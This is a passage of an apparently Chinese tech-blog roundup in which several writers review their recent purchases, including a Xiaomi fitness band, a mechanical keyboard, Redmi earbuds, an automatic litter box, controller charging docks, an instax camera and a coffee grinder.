元（六瓶装）</li>\n</ul>\n<p>夏天到了，谁还能不来瓶可乐呢？</p>\n<p>爱喝可乐的朋友一定都知道一个都市传说——玻璃瓶版的可乐最好喝。作为一个可乐党，面对这种毫无科学依据的封建迷信，我当然是坚定不移地相信了。我在搜瓶装可乐时发现，可口可乐已经推出了无糖版的玻璃瓶包装，于是果断下单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/article/f5d598a7c9dc12894fa0c504737b1022\"><figcaption>无糖版喝完了，用经典版做个展示吧</figcaption></figure><p>只有手里拿着玻璃瓶可乐，才能真正体会到夏天的感觉。虽然「无糖可乐没有经典可乐好喝」是可乐之友们的共识，但当无糖可乐装进玻璃瓶，口感依然大幅提升，多了几分「正宗」的滋味。尤其健身或者出大汗之后从冰箱里拿出一瓶，吨吨吨来上三口，可谓相当过瘾。</p>\n<p>而且，玻璃瓶版还能混搭购买，我买的就是三瓶经典、三瓶无糖（零度）的套装，你也可以选择全无糖或者全经典。鉴于六瓶装已然不过瘾，我又在淘宝上找了一家，买了街头小店里标配的二十四瓶装经典款，目前还在物流的路上。不过，考虑到我喝全糖版能力有限，我已经计划好了收到之后带一半到公司，让大家都胖起来。</p>\n<p>可乐作为全世界人民都喜欢的大众消费品，其实无需介绍太多。我写这几段的主要目的是为了提醒你：夏天到了，可乐喝起来啊！</p>\n<p>还有——可乐必须是可口可乐啊！</p>\n<h2>@路中南：小米手环 6 NFC 版</h2>\n<ul>\n<li>购入渠道：线下购物</li>\n<li>购入价格：259 元</li>\n</ul>\n<p>在生态间反复横跳的我，在送走 Apple Watch 后，我的手腕大概空了半个多月，还是有想准备在新版 wearOS 硬件出来前找个腕上智能设备过渡一下。期间曾对荣耀手环 6 心动，外观设计和屏幕深得我心，最后还是因为客户端劝退：这类国产以及三星的智能可穿戴产品，基本都配有一个不好看也不好用的客户端，不仅涉及到部分隐私问题，体验也不太理想。</p>\n<p>在好友 @Sol 的分享下，我意识到小米系列的手环产品在 Android 上是有不少第三方客户端可配对使用的，而几年前我付费入正的 <a href=\"https://play.google.com/store/apps/details?id=com.mc.miband1&amp;hl=en&amp;gl=US\">Notify for Mi Band</a> 如今也拥有了不错的设计界面<s>（只能说和 AutoSleep 类似吧）</s>，现在还能直接获取配对 Token、包揽手环的系统升级，理论上完全不需要小米官方客户端介入。</p>\n<p>Notify 在应用商店的标语就是「Your Privacy first」，主打推送应用通知功能的同时注重隐私保护，比如睡眠数据分析可以选择本地的算法或是他们服务器云端的算法，后者也承诺不保留用户数据。第三方表盘市场相比官方客户端也有更多丰富的选择。客户端整体设计上更偏向数据和图表的展示，相当相当满意；关键功能的调节如心率、血氧等需要各自点击齿轮图标自行设置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/4e73604ad32927c2f854ec7fa61da5a1.png\"><figcaption>左：睡眠时血氧的监测可以很好反映睡眠过程中有无打鼾或者呼吸方面的意外状况；右：心率区间的分布对于运动有重要的指导意义</figcaption></figure><p>总体使用下来，因为手环本体还是使用的官方系统，一些底层机制还是无法逾越（比如只能在睡眠时监测血氧），但一些参数可以比较自由设定，许多功能会提示耗电<s>但我还是毫不犹豫开启了</s>。除此之外，这个手环更像是一个「原始数据收集器」，睡眠那些数据都是 Notify 自行分析的，此外它还自己整了一个 COVID-19 监测，每日平均心率有持续异常升高的话，会提示感染风险仅供参考。小米自己做的 PAI 算法则是另外单列了出来依靠手环计算，客户端无法干预。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/a6dc4f38cf5ac446da627c9d319f6c2a.png\"><figcaption>左：客户端的首页呈现，可自定义；右：睡眠依赖云端服务器上的算法</figcaption></figure><p>Notify 还可选同步数据到 Google Fit，看似近乎完美，但有个关键功能无法取代──NFC 的模拟和公交卡的使用。本着「可以不用但不能没有」的心态购入了 NFC 版，没想到这些功能依旧需要官方客户端来执行，虽说 Notify 是可以同时和官方客户端搭配使用的但我就是不想。建议奔着 Notify 去的买家可以直接购买非 NFC 版本，价格更低续航还稍好。</p>\n<p>哦说到续航，除了一整晚的血氧睡眠检测比较耗电（一晚上 7%），其余情况下就算开了很多「耗电警告」功能也几乎感知不到耗电，让我这个老 Apple Watch 用户挺不习惯的，还是习惯洗澡的时候给设备充电，电量于是就还没有下过 90%。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/3d621a590c67112131bc6f57dc9ead92.png\"></figure><p>小米手环 6 硬件本身我是比较嫌弃的：腕带不怎么透气、屏幕上下边框不对称、屏幕过小看着累等等。手环的外观设计上我更偏好荣耀手环 6。Notify 应该还支持米系其他可穿戴设备，另有制作 <a href=\"https://play.google.com/store/apps/details?id=com.mc.miband1&amp;hl=en&amp;gl=US\">Notify for Amazfit &amp; Zepp</a>。</p>\n<p>我个人对于这类产品的定义都是「数据采集器」，硬件都是其次的，硬件所采集到的数据到底如何呈现才能让用户认为可以指导自己的生活，才是最重要的。除此之外，就是用户数据和隐私保护了。</p>\n<h2>@北鸮：MelGeek Mojo60 Christian 蓝牙双模机械键盘</h2>\n<ul>\n<li>入手渠道：<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=649660843994\">少数派商店</a>\n</li>\n<li>价格：899 元</li>\n</ul>\n<p>在入手这把键盘之前，我就已经是 MelGeek 的用户了。头回听说他们是在一个客制化论坛上，Mojo60 的铝制键盘外壳和 MG Ember 键帽看得我眼馋，但当时键帽已经截团，铝坨坨我也没闲钱，于是就退而求其次，买了他们的第一把 PC 外壳的成品双模键盘 Mojo60 Ember。经过几个月的等待它终于到了手，但我实在用不惯 60% 标准配列，没用多久就转了出去。后来又买了他们的 MG Wahtsy 键帽，因为手里没什么合适的键盘可配，还是只能放在柜子里供着——这让我怨念颇深，一方面很想享受 MelGeek 的美貌，一方面又实在用不顺手，着实可惜。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/4294db4be1bb8c50503bf3df41ae8131.png\"><figcaption>左右图，左：Mojo60 Ember 遗照，右：MG Wahtsy 在 Leopold FC980 上</figcaption></figure><p>不过这回整来的 Mojo60 Christian 让我开心了。Christian 算得上是 Ember 的续作。它延续了 Mojo60 Ember 的 PC 外壳，但是换了一个很耐看的肉粉色。表面的亚光处理避免了 Ember 两个版本都是指纹收集器的问题，摸着还特别舒服，温温润润的。键帽采用了 MelGeek 自家的 MG 高度 ABS 二色球帽，手感不错，字符也很清晰，保持了 MG 键帽的一贯水准。我觉得 MG 这个高度在非等高球帽里算是比较友好的，保留美观弧线的同时不会高到没法日用，不过我还是觉得手指接触面小了点，可能跟它按键正面下凹的弧度有关系，总会按到棱上。MelGeek 一直在配色上有一手。我本来看渲染图觉得主键区可能是那种复古白，结果到手才发现这个颜色更接近化妆品那种粉饼的肉色，饱和度也比较低。但把它放上桌面一用起来就发现，一个耐看的颜色对这种日用小键盘加成非常大：盯着屏幕不抢眼，休息时一看还挺好看，颇得我心。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/2c3d2b321c24b68bc2c2188805976aef.jpeg\"></figure><p>除此之外，这键盘跟 Ember 相比还有两个重大升级。第一，配列终于不再是标准 60% 而是左移 64 配列了，这意味着常用方向键的我可以减轻不少按组合键的负担，虽然 2u 左 Shift 需要一小段时间适应，但对于一个人体工学键盘都在随时换着用的人来说，这不是什么大事儿。第二，就是这次成品的轴体从佳达隆的 RGB 轴换成了 TTC 的金粉轴和月白轴。不说别的，作为一把热插拔双模 RGB 键盘，上代 Ember 用的佳达隆 RGB 轴为了兼容更多灯珠把轴体卡扣附近做得很薄，我光是拔轴就拔坏了快十个。这次 TTC 的轴体一方面手感更稳定更优秀，另一方面也给热插拔提供了不少方便。我这把是月白轴，它是大段落轴体里比较奇特的一个，按下去没什么声音，回弹时会有撞击轴盖的「哒」一声，可以尝尝鲜，另一个选择金粉轴也是现在比较优秀的量产线性轴体。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/f4a53cb7980fa9e89d113e80248db7ef.jpeg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/0c5511b38d039d3d37bd5299655e790a.jpeg\"><figcaption>包装内附送的 MelGeek 小蜜蜂个性键帽</figcaption></figure><p>说回价格，相比于一般的 60% 键盘，单独看这个 899 的价格算是比较高的，但是仔细想想，拿到手的是一把 RGB、热插拔、蓝牙 5.1 双模、多设备切换各种功能堆齐的键盘套件，一套不单独出售的高质量键帽，一组市价差不多 3 元一颗优秀的轴体，到手即用还很好看！单冲这个颜值，我也不觉得亏了。MelGeek 算是国内这些客制化厂商里面比较努力在做量产商品的，一直以来产品质量都很高，主理人审美也在线，希望他们能拿出更多好作品吧，然后团购赶快发货（小声）。</p>\n<h2>@Clyde：Redmi AirDots 3 Pro</h2>\n<ul>\n<li>购入渠道：京东旗舰店</li>\n<li>购入价格：299 元</li>\n</ul>\n<p>Redmi AirDots 3 Pro 还真是一款超出我预期的产品，毕竟当时纯粹是奔着充电盒长得像 Pixel Buds 才入手的。</p>\n<p>那就先说说外观。在 WF-1000XM4 到手之前，Redmi AirDots 3 Pro 是我手里充电盒最小的真无线降噪耳机。充电盒正面几乎和 Pixel Buds 一模一样，手感圆润，没有半点锋利的棱角，握在手里像是一小块打磨光滑的鹅卵石，能够带来充足的愉悦感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/002437806ef1ca92748f614d2b9489f0.png\"></figure><p>耳机本体的颜值也不差，外观不是我所讨厌的那种「经过市场验证的成熟设计」，材质和充电盒一样略带那么一点点「亲肤」的质感；触控感应区域采用了一整块亮面塑料，试图营造一种宝石版的视觉效果但失败了，个人感觉看上去像是街边做的指甲，廉价感仅次于松松软软的耳塞。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/51d51df610e221b56f596a67e83a5c5b.png\"></figure><p>外观总体能打个 90 分吧，可能有 Pixel 用户的 10 分加成在里面。但这款耳机和此前的所有小米耳机一样，实际体验和 Pixel 没有半点关系，甚至可以说是一款「非小米/Redmi 机型别买」的产品。</p>\n<p>往好的方面说，Redmi AirDots 3 Pro 作为一款 300 元价位的真无线降噪耳机，功能和体验可谓「爆炸多」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/2d57caa264d866ab54506e52373bebd8.png\"></figure><p>降噪方面支持两种通透模式、轻度/均衡/深度/自适应四档降噪模式，35db 的降噪深度作为一款降噪耳机日常使用完全没有问题；连接到小米手机后还可以在小爱同学「实验室」中开启「自适应畅聊」，检测到用户说话后自动开启通透，这个通透模式体验甚至比 WF-1000XM4 还要好一点 —— WF-1000XM4 敏感到咳嗽一声都会触发，但 Redmi AirDots 3 Pro 不会。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/be4a65b553e8eeddf9f11a2079f0e3cc.png\"></figure><p>虽然不支持小米中高端 TWS 耳机的 LHDC 高解析度蓝牙传输协议，但 Redmi AirDots 3 Pro 支持低延迟游戏模式，同时因为支持蓝牙 5.2，也可以同时连接最多两台常用设备，免去切换的烦恼；具体到我的使用场景，就可以同时连接小米手机和 Pixel 手机了，如此一来既能在小米手机上进行丰富的连接设置和固件更新等操作，又能免切换在 Pixel 上脱离难用的小爱同学客户端使用。美啊！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/bfd0a086a93fe489c07fe985c9762409.png\"></figure><p>除此之外 Remi AirDots 3 Pro 还支持贴合度检测、手势检测、防丢提醒、语音播报、耳机查找等等功能，简直应有尽有，给人的感觉就是只要不谈音质，它就能在 300 元的价格内让你尽可能多地感受到技术进步带来的幸福。</p>\n<p>往坏的方面说就是这依然是一款我不会搭配非小米/Redmi 机型使用的耳机了。反馈了这么久，小爱同学客户端依然没有做好自适应图标、依然无法拒绝录音权限使用、依然没有个体面的通知栏小图标，<strong>整体体验是真的烂</strong>。如果你没有小米或者 Redmi 机型搭配使用，那就别买。</p>\n<p>至于音质怎么样我就不过多评价了，小米的产品我一直都坚持一个观点：去线下「小米之家」体验了再说；毕竟除了听，能不能戴稳、戴着舒不舒服这类问题只有戴上了才知道。</p>\n<h2>@Microhoo：小佩自动猫砂盆</h2>\n<ul>\n<li>购入渠道：淘宝旗舰店</li>\n<li>购入价格：1427 元</li>\n</ul>\n<p>养猫最大的两个痛一是掉毛，二是屎臭，前者以人类的姿势水平目前似乎依旧无解，但好在后者现在市面上已经有不少靠谱且成熟的解决方案，算是很大程度了减轻了我的负担。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/4565aa68f5694dcf79925b8ad2fad3a6.jpeg\"><figcaption>PetSafe 贝适安自动猫砂盆</figcaption></figure><p>我之前用过 PetSafe 贝适安自动猫砂盆，作为入门级的自动猫砂盆它的弊端也代表着这类产品需要解决的痛点：</p>\n<ol>\n<li>只能使用膨润土猫砂；</li>\n<li>虽然可以自动收集猫屎猫尿但敞开式设计无法更好解决臭味；</li>\n<li>空间狭窄，不仅很容易带得周边地面全部是猫砂而且机身上常被糊得屎尿都是；</li>\n<li>清理麻烦，每次换猫砂需要整个拆开倾倒，而且因为是机械阻力传送带设计很容易卡住屎尿猫砂。</li>\n</ol>\n<p>以上四点是我使用这款产品时最不满意的地方，而原来的猫猫被我妈招安之后即便把这个猫砂盆带了回去她懒得用我也没有动力催。不久前被迫收养了一只小母猫，开始重新思考铲屎铲尿的事儿之后我决心重新买一个猫砂盆，研究再三后买了小佩自动猫砂盆，至今已用月余非常满意。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/f30c97dedba1ec3abcf860cddc4f92bb.jpeg\"></figure><p>其实我还是第一次使用这种封闭式猫砂盆，最初我是非常担心小猫不适应的，但没想到它在旁边看着我组装好倒入猫砂后就迫不及待的钻进去拉了一泡尿，省去了我「怎样才能让它习惯」的烦恼。接下来我便直接通过前文提到的试用前一款自动猫砂盆的烦恼来介绍这个猫砂盆的优点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/8386cf242ca724796f71ce539bbc9d9b.jpeg\"></figure><p>这款产品可以使用目前市面上的大部分猫砂，也就包括除臭效果更好的豆腐猫砂，而除此之外它还可以添加专制的除臭液，可以理解为空气清新剂吧，可以每天定时固定清新里面的空气，至于这款产品整体的除臭效果，反正猫砂盆就放在书桌旁边我的正对面，除了偶尔猫猫刚拉完屎的那两分钟，大部分时候我是感知不到那里放了一个集粪器的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/2ca6d9b91f7002511c1670c58a011839.png\"></figure><p>另一个值得一提的就是它的拉屎空间非常宽敞，至少在我特别关注下也没有发现内壁被糊上屎，也就意味着大部分中等体积的成猫是可以在里面自由旋转的，宽敞的拉屎空间一个是解决了猫砂容易被带出的问题，其次就是猫身上也比较干净，同时得益于我家猫良好的生活习惯，每次我突击检查它的屁屁时都非常的干净整洁。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/a60c39606c46034308af7d44ab850ac2.jpeg\"></figure><p>最后就是清理，在猫砂盆下方有一个抽屉式垃圾桶，每次猫砂盆自动清理完的屎尿都会漏到这个垃圾桶里，包括如果想更换新的猫砂时也可以一键倾倒所有猫砂进去，封闭性较好，垃圾桶快满时 app 也会通知提醒，别看我只有寥寥几句话，但真的让我很快乐。</p>\n<p>反正从一个普通使用者来说这款产品我目前是挑不出任何毛病的，唯一一个小问题就是它每次清理猫屎尿时动静比较大，一开始我家猫会很好奇总是爬进去看，它的红外感应比较灵敏每次我家猫一靠近就自动停止了，猫走了才继续，但好在现在我家猫已经见怪不怪不那么好奇了所以也不存在问题，就是不知道如果别的猫猫比较胆小或者其它性格原因的话会不会因此抗拒使用就不得知了。</p>\n<h2>@老麦：日本保尼卡吸门器</h2>\n<ul>\n<li>购入渠道：京东旗舰店</li>\n<li>购入价格：105 元</li>\n</ul>\n<p>吸引器，一个大家不会关注的点，但你需要的时候，又变得非常重要。我派二楼的玻璃会议室没有设置通风口，没人使用的时候，需要保持开放通风，同时，也可以让会议室里的空调冷气循环出来，所以需要一个吸门器，来随时保持开关状态。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/167cc1577f3f4e555bfa73cfc2cfb183.jpeg\"></figure><p>市面上常用产品都是磁性吸门器，我也就随便买了一个，但这样一个小产品，竟然也有很大的体验差异，首先是磁力不一定够，我们的玻璃门回弹力量很大，所以有时候不能一下吸住，或者会自己脱开。然后是粘贴的双面胶质量不行，玻璃门上的磁块，很快就掉下来了。前后也就用了一个星期。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/8256463fc026e47e737d076f1aa149bc.png\"></figure><p>于是我继续在电商平台寻找，发现了这个产品，价格当然也贵了两倍，但看起来质量不错。收到之后，还是蛮惊讶的，首先他不是依赖磁铁，而是一个巧妙的纯机械结构，锁住是脱不开的，其次是配件非常高质量，比如铝合金的粘贴板，纳米双面胶，粘贴清洁布等等，尽量让你的安装环节一步到位，不出问题。还有一个清洁地面的保护盖，防止拖地扫地进水等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/737960f3c38e4bac6753843f30f6dfe1.gif\"></figure><p>装上之后的体验就更好了，门挡撞击开关，触发外圈转动，然后锁住，再推一次打开，如此循环，还有点解压。</p>\n<p>这个小产品，一样可以做到这么细节，生活中有太多值得提升和优化的痛点需求，想起之前一个朋友从日本带回来的无钉钉书机，设计也是非常巧妙。</p>\n<h2>@SamWanng：imPoi 手柄充电底座 PS5 版</h2>\n<ul>\n<li>入手渠道：问路哥给的</li>\n<li>参考价格：<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=648431972566\" target=\"_blank\">领券 89 元</a>\n</li>\n</ul>\n<p>在 PlayStation 5 国行还没有发售的时候，为了玩 FIFA 我就入手了一把 DualSense 手柄。后来我发扬敢为人先的国行猛士精神，预定了首发的国行 PlayStation 5。至此，我就拥有了两把 DualSense 手柄。</p>\n<p>购买 PlayStation 5 的时候我还犹豫过，要不要买官方的充电座，由于机器本身就是一笔很大的开销了，就此作罢。</p>\n<p>然而 DualSense 手柄比 DualShock 大了那么一圈，两把手柄的摆放要占很大一块地方；在充电方面，虽然官方声称 DualSense 的续航时间更长了，但是在长时间发挥新手柄特性的情况下，电量消耗也很快，充电要用 Type-C 线缆，而且要充两把，那么使用后能够随手就能充电就方便不少。</p>\n<p>这时候我就有了购买官方 DualSense 充电底座的念头，在我打开京东、淘宝后发现，官方渠道早已无货，想拥有就得加钱。（DualSense 充电底座官方原价 ¥229，第三方渠道 ¥300 - ¥500 不等）</p>\n<p>过了没多久，问路就送了我一台 imPoi 的 DualSense 充电底座。这台充电底座很好地解决了我在前面提到的种种问题，也让我的钱包舒了一口气。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/86ee2d42e0129150b096eaa310515cb4.jpeg\"></figure><p>在第三方 DualSense 充电底座中，我觉得 imPoi 的这款是在设计上最接近 PlayStation 5 设计语言的。白加黑的配色，橙和蓝的 LED 指示色，会让人以为这就是官方原装的。</p>\n<p>这款 DualSense 充电底座其实没什么可以过多介绍的，因为它的存在就是为了不那么「存在」，一切都融入在你的游戏和生活中，你无需在意到它的「存在」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/af820e702946279dcd232a6f13f0fb66.png\"><figcaption>当 LED 灯从橙色变成蓝色时，手柄电量充满</figcaption></figure><p>打完游戏，随手放在底座上，收纳摆放的同时对手柄进行充电，当 LED 灯从橙色变成蓝色时，你的手柄就已经充满电了。很难再碰到那种拿起手柄发现没电，还要拖着一根线一边充电一边玩的情况。</p>\n<p>除此之外还为 PlayStation 4 的 DualShock 手柄提供了套件，如果你的 PlayStation 4 还在服役，那么也能够轻松兼容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/d232da47d48e33907cef84e4211285f0.png\"></figure><p>总之，imPoi 这款充电底座不论在设计、功能、使用体验以及性价比等几个方面，都做到了很好的平衡，如果你也买不到原价的官方充电底座不妨可以试试这款。</p>\n<h2>@BeckMint ：imPoi Xbox 手柄充电底座与电池组</h2>\n<ul>\n<li>入手渠道：问路哥给的</li>\n<li>参考价格：<a href=\"https://item.taobao.com/item.htm?spm=a2oq0.12575281.0.0.50111debJmyLgb&amp;ft=t&amp;id=648432364962\" target=\"_blank\">你问问问路</a>\n</li>\n</ul>\n<p>从 Xbox 360 时代过来的人，如果要问玩这游戏机费什么，那肯定是费干电池。现在想起来，那时 360 的手柄大概玩不到半个月就要换一次电池，是有点频繁。后来有了可充电的电池组，免去乐买电池的麻烦。但可能当时的电池技术不行，装上去沉甸甸的，玩个一周多时间又要充电。</p>\n<p>后来直接买 360 有线手柄，线长两米多，玩起来轻手又过瘾，就是数据线拆不了很难收纳。进入Xbox One 时代，我仍然保留着不用电池，连接数据线玩的习惯。</p>\n<p>然后问路哥给了我这款 imPoi 手柄座充。听他说也有 PS5 版，但我没有两个 PS5 手柄，所以没给我。</p>\n<figure class=\"ss-imgRows\" figcaption=\"有黑白两色款\"><img src=\"https://cdn.sspai.com/2021/06/23/039526de8dc6327f18c7ba334259b7f0.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/23/925b51fd497b2e1da4ed8fa41374d744.jpeg\" alt=\"\"></figure><p>包装里有一个座充（我这个是黑色的），两块 1200mAh 的电池组、四块电池盖、一根 USB 充电线。</p>\n<p>我用来充 Xbox One 的手柄，但其实也兼容 SERIES X/S 手柄。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/23/122c9ae41a59ce3ed3aff72451aa29fa.jpeg\"><figcaption>第三排的是原装手柄电池盖，看上去比两颗干电池省空间</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/23/5a760e2e886c417264cc4331723068ff.jpeg\"><figcaption>充电电池组装上去</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/23/a46d0f61181bb22f494d2b2f8758390b.jpeg\"><figcaption>座充像大哥大</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/23/c89deaaf302205eb8835388af0b1e3f7.jpeg\"><figcaption>手柄放上去就自动充电</figcaption></figure><p>座充前后的 LED 灯会根据手柄状态亮灯，充电时显示红灯，充满后显示绿灯。</p>\n<p>说下感受，前面说我比较怕以前那种装上充电电池后，手柄变得很沉，会影响游玩体验。但想不到 imPoi 的充电电池组装上去后，手感还可以。具体重量没称过，但感觉比装干电池时还轻一点。</p>\n<p>充电后能玩多久也没测试过，不过充电座充嘛，本来就是玩的时候拿起来，不玩的时候放回去充电，不应该去考虑续航时间的。希望每个不想插数据线充电，想要有整洁主机环境的玩家都入手一个吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/23/cdf122aa5293392ea2464b26beb2a279.jpeg\"><figcaption>最后把他放到我的副工位上了</figcaption></figure><h2>@许万里Alva：instax mini 90 拍立得</h2>\n<ul>\n<li>入手渠道：闲鱼</li>\n<li>入手价格：750元（带保护壳裸机+充电器+30张过期相纸）</li>\n</ul>\n<p>一次成像相机是我一直很想入手的玩意，但每次想要买的时候，都有人会和我说「我有啊，买了没用过几次就闲置了」，又或是「不如买xxx」之类的言论。虽然并不是什么建设性的意见，但还是很影响购买心情嘛，于是迟迟没有下手。而这次「想买-下单-取到货」在半天内完成，没给他人影响我的机会🌝。</p>\n<p>因为我是在闲鱼上联系卖家面交的，中午约好下午交易，于是得以在半天内便拿到了相机📸️。750 元的价格买到带壳裸机和 30 张过期相纸，机身有磕碰痕迹，整体较新。相比官网单机身 1188 元的价格，这个品相的二手价格还算可以接受～</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/d0c06e6dda0af61e15391043d2da972b.jpeg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/51a512a7716078439e27e7ddb5c0d2ed.jpeg\"><figcaption>NEO（全新的理念、超越前作的功能）＋CLASSIC（经典的传承、复古的设计）</figcaption></figure><p>在购买 mini90 之前，我曾一直在宝丽来和富士拍立得之间犹豫。宝丽来复古的机身造型、较大的胶片尺寸都十分吸引我，但在浏览了一圈宝丽来的卖家秀之后，发现宝丽来风格鲜明、胶片色彩重的成像颜色并不是很合我胃口，最终还是选择了富士。</p>\n<p>而原本用于购买宝丽来的预算放在富士拍立得上，最直观的感受就是「相纸好便宜啊」，相比宝丽来 10 元每张的拍摄成本，mini 相纸只需 3.5 元每张，因此拍起照来也更随心一些 🎞️。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/c597800296090282c7d2379e310eb1a3.jpeg\"><figcaption>和朋友在学校操场聊天到深夜</figcaption></figure><p>instax mini 90 一直都被视为富士的「拍立得机皇」，即便发售是在 2013 年——至今已过去8年，但放在当今仍是旗舰机级别。相比同样是使用 mini 相纸的其他拍立得机型，mini90 配置了更丰富的拍摄模式，除了可以B门拍摄和双重曝光，还配置了内置微距等功能。底部还有可以用于装在三脚架上的螺丝口，在自拍时非常方便。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/5fd89a89c218073571fbfd79c0f7acba.png\"><figcaption>图片来源：<a href=\"https://instax.com/mini90/cn/guide/\" target=\"_blank\">富士官网</a></figcaption></figure><p>虽然我很喜欢摄影，但是我并不擅长自拍，在集体合照时也还经常被拍出一些「成像比真人难看」的照片，由此上镜时总会有些抗拒。但使用拍立得拍照则没有这种担忧，一来因为胶片的尺寸比较小，难以像相机拍摄的照片那样放大来看；二来是拍立得自带的胶片效果更容易拍出好看的合照（或许也有一部分是心理作用啦）。因此用拍立得留存包含自己的生活影像，于我而言还是蛮不错的体验～</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/1876cfa6008d28d13b516dc3e47f5e3c.jpeg\"><figcaption>某次活动结束后的合照</figcaption></figure><h2>@SunsetYe：泰磨栗子 C2 手摇磨豆机</h2>\n<ul>\n<li>购入渠道：淘宝授权店</li>\n<li>购买价格：253 元 （活动价）</li>\n</ul>\n<p>在入坑精品咖啡的一开始就买一个磨，对于我来说纯属意外。</p>\n<p>我的咖啡入坑路径和大多数人差不多，先是雀巢、G7 这类普通速溶，再到三顿半、永璞这类风味保留更完整的冻干粉 / 冷萃液。后来接触了挂耳包，发现不同口味的挂耳包和「刷锅水」的区别越来越大之后，终于算是一只脚踏进了这个坑。</p>\n<p>于是，我一口气下单购买了 V60 滤杯、滤纸，买了两包咖啡豆并留言磨粉。这时候意外发生了：我本该收到 2 包磨好的粉，但打开快递发现收到的是一包粉、一包豆子，这让我大大提前了购买咖啡磨豆机的打算。</p>\n<p>之前围观过 @纸寿司 和 @flypig 对于咖啡研磨设备的「约战」，结论也很明显：咖啡的研磨设备能很明显地改变出品风味。有了这个印象，我在挑选的时候也有意放宽了预算，打算用 500 以内的预算购买一台性价比高、较为耐久的磨。</p>\n<p>栗子 C 则是泰磨出品的一台两百元级别的单品磨，采用了五刀盘 CNC 不锈钢磨芯，而在这个价位使用不锈钢磨芯的产品并不多，栗子 C 给入门爱好者带来了更多的选择。俗称的栗子 C2 将原先旧版的粉桶、拨盘升级为金属，大幅提高了耐用性，并解决了静电问题。</p>\n<p>在使用过程中，它的效果也很让我惊喜：磨盘几乎不吸附咖啡粉、调节刻度时手感明确，研磨常规刻度也较为省力，纤细的身材就算是小手也能轻易握住。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：栗子 C 全家福 右：研磨浅烘焙豆子留下的银皮\"><img src=\"https://cdn.sspai.com/2021/05/21/0f28ae50c2ce188f554c17ef5bd37a94.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/21/ab1745c7d351d6e4a81eddd300737674.jpg\" alt=\"\"></figure><p>栗子 C 的定位是一个单品磨。它在 7 格以上时磨盘空转不会碰刀，10 - 14 格为推荐的意式粗细，18 - 24 格为推荐的手冲粗细，25 - 27 格为推荐的法压粗细。以下则是我对几个常用研磨度做的测试（非专业拍摄，仅供参考；除 Ditting 7.5 为中深烘培双重厌氧日晒外，其余为浅烘培耶加雪菲水洗）：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/21/article/2a1e05e9060a810fefcf5d2fdef7f3f9\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/21/article/11e923f34078e9264976e9925d12dc9d\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/21/article/186c95f94ce871f8dac5754b35639768\"></figure><p>要不要在一开始就入手一台咖啡豆磨？对我来说，购买的好处是明显的：可以购买未磨粉的咖啡豆，大幅延长咖啡的赏味期；可以磨出意式、手冲、法压等不同粗细；对于手冲，可以用不同的研磨度冲泡同一支豆子，在细微的不同中训练自己的感官与手冲技巧。</p>\n<p>而两百多的价格也给预算不够充足的人群提供了一个很好的解决方案，泰磨栗子 C 